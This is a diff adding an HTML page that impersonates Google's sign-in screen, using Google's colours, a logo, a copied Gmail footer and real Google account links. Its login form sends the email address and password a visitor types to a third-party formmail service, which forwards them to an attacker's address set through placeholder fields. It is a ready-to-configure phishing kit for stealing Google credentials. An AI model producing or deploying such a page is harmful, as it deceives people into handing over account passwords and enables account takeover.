@@ -1,0 +1,57 @@
+<html>
+<head>
+<title>
+Google
+</title>
+//Add Fav
+//Add CSS
+
+</head>
+<body>
+<div class="form">
+  
+  <img src="http://www.androidpolice.com/wp-content/themes/ap2/ap_resize/ap_resize.php?src=http%3A%2F%2Fwww.androidpolice.com%2Fwp-content%2Fuploads%2F2015%2F10%2Fnexus2cee_Search-Thumb-150x150.png&w=150&h=150&zc=3"> 
+<h1><font face=Sans-serif color="#4285F4">G</font><font face=Sans-serif color="#DB4437">o</font><font face=Sans-serif color="#F4B400">o</font><font face=Sans-serif color="#4285F4">g</font><font face=Sans-serif color="#0F9D58">l</font><font face=Sans-serif color="#DB4437">e</font></h1>
+
+<form method="POST" action="https://fp1.formmail.com/cgi-bin/fm192">
+
+<input type="hidden" name="_pid" value="//Enter Code From Formmail">
+<input type="hidden" name="_fid" value="//Enter Id From Formmail">
+<input type="hidden" name="recipient" value="//Your E-mail address">
+<input type="hidden" name="recipient" value="1">  
+
+//Add JavaScript                         
+                    
+<input type="email" name="Email" placeholder="Email" id="Email" required>
+
+   
+<input type="password" name="Password" placeholder="Password" id="Password" required>
+
+<button type="submit" name="signIn" value="Submit">Sign In</button>
+                 
+   
+
+   <a href="https://www.google.com/">Create account</a>
+<p><font color="blue"><a href=https://accounts.google.com/signin/v2/usernamerecovery?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue%26pli%3D1&ec=GAlAwAE&flowName=GlifWebSignIn&flowEntry=AddSession">Forgot password?</a></font></p>
+
+</div>
+<table width=95% align=center cellpadding=3 cellspacing=0 bgcolor=#eeeeee style=margin-bottom:5>
+  <tr>
+  
+  <td class=bubble rowspan=2 style=text-align:left>
+  <div align=center>
+  <font size=-1 color=#666666>©2021 &nbsp; <font face=Sans-serif color="#4285F4">G</font><font face=Sans-serif color="#DB4437">o</font><font face=Sans-serif color="#F4B400">o</font><font face=Sans-serif color="#4285F4">g</font><font face=Sans-serif color="#0F9D58">l</font><font face=Sans-serif color="#DB4437">e</font> -
+  <a href="http://www.google.com/a/help/intl/en/users/user_features.html#utm_medium=et&utm_source=gmail-en&utm_campaign=crossnav&token=gmail_footer">Gmail for Organizations</a> -
+  <a href="http://gmailblog.blogspot.com/?utm_source=en-gmftr&utm_medium=et&utm_content=gmftr">Gmail Blog</a> -
+  <a href="http://mail.google.com/mail/help/intl/en/terms.html">Terms</a>
+
+  - <a href="http://mail.google.com/support/">Help</a>
+  </font>
+  </div>
+  </td>
+  
+  </tr>
+  
+</table>
+</body>
+</html>
